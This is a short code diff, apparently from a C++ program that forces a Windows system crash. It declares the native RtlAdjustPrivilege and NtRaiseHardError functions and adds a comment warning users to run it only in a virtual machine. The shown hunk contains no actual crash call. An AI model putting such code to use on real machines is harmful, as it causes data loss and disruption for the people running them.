@@ -8,6 +8,12 @@ EXTERN_C NTSTATUS NTAPI RtlAdjustPrivilege(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
 EXTERN_C NTSTATUS NTAPI NtRaiseHardError(NTSTATUS ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask, PULONG_PTR Parameters, ULONG ValidRespnseOption, PULONG Response);
 using namespace std;
 
+
+/*
+
+pls dont try it on a real pc even if its old , try it only on vmware/vbox/wsandbox/hyper-v
+
+*/
 int main()
 {
 	//boolean
